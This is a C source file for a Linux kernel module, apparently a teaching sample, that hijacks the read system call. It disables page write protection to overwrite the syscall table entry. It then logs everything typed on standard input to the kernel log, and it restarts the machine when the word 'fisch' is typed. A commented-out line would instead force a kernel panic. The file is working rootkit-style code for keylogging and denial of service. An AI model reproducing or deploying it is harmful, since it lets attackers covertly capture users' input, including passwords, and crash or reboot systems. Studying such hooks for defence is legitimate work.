#include <linux/moduleloader.h>
#include <linux/unistd.h>
#include <linux/reboot.h>
#include "sysmap.h"		// for sys_call_table address this is Device spesific
#include <asm/atomic.h>
#include <linux/delay.h>

#define DRIVER_AUTHOR "Moritz Dötterl <moritz.doetterl@tum.de>"
#define DRIVER_DESC   "A sample kernel module hijacking the read"

int z = 0;
atomic_t in_original_read;

unsigned long *sys_call_table = (unsigned long*) MAP_sys_call_table; // Address of the Syscall table from sysmap

asmlinkage int (*original_read) (unsigned int, char __user *, size_t);

asmlinkage int hacked_read(unsigned int fd, char __user * buf, size_t count)
{
	int i;

	atomic_inc(&in_original_read);
	if( fd == 0 )		// reading from stdIn
	{
		i = original_read(fd, buf, count);
		printk("ReadCounter: after %d\n",atomic_read(&in_original_read));
		switch(z) {		// search for input pattern
			case 0:
				if(buf[0] == 'f') {
					z=1;
				}
				else z=0;
				break;
			case 1:
				if(buf[0] == 'i'){
					z=2;
				}
				else z=0;
				break;
			case 2:
				if(buf[0] == 's'){
					z=3;
				}
				else z=0;
				break;
			case 3:
				if(buf[0] == 'c'){
					z=4;
				}
				else z=0;
				break;
			case 4:
				if(buf[0] == 'h'){
					//printk("found!\n");					// Found our magic pattern "fisch" from stdin
					kernel_restart(NULL);					// Restart the system
					// panic("Forced Panic! Go Crazy!");	// Make the kernel panic and crash the system :D
				}
				else z=0;
				break;

		}
		if(z==0) {
			printk("Message: %.*s\n", (int)count, buf);		// Print intersected data
		}
		atomic_dec(&in_original_read);
		return i;
	}
	else {		// read from anything but StdIn
		//atomic_inc(&in_original_read);
		i = original_read(fd, buf, count);
		//atomic_dec(&in_original_read);
		//printk("ReadCounter: after %d\n",atomic_read(&in_original_read));
		atomic_dec(&in_original_read);
		return i;
	}
}

/* Make the page writable */
int make_rw(unsigned long address)
{
	unsigned int level;
	pte_t *pte = lookup_address(address, &level);
	if(pte->pte &~ _PAGE_RW)
		pte->pte |= _PAGE_RW;
	return 0;
}

/* Make the page write protected */
int make_ro(unsigned long address)
{
	unsigned int level;
	pte_t *pte = lookup_address(address, &level);
	pte->pte = pte->pte &~ _PAGE_RW;
	return 0;
}

static int __init init_mod(void)
{
	printk("Insert Hock\n");
	atomic_set(&in_original_read,0);
	make_rw((unsigned long)sys_call_table);
	original_read = (void*)*(sys_call_table + __NR_read);
	*(sys_call_table + __NR_read) = (unsigned long)hacked_read;
	make_ro((unsigned long)sys_call_table);
	printk("Hock is running\n");
	return 0;
}

static void __exit  exit_mod(void)
{
	printk("exiting hook\n");
	make_rw((unsigned long)sys_call_table);
	*(sys_call_table + __NR_read) = (unsigned long)original_read;
	make_ro((unsigned long)sys_call_table);
	if(atomic_read(&in_original_read)!=0) 
	    printk("waiting for instance to be finished\n");
	while(atomic_read(&in_original_read)!=0){
		msleep(10);
	}
	printk("hook is not running anymore\n");
} 

module_init(init_mod);
module_exit(exit_mod);

MODULE_LICENSE("GPL"); 				/* Declare it as GPL License */
MODULE_AUTHOR(DRIVER_AUTHOR);		/* Declare the Author        */
MODULE_DESCRIPTION(DRIVER_DESC);	/* Short description         */
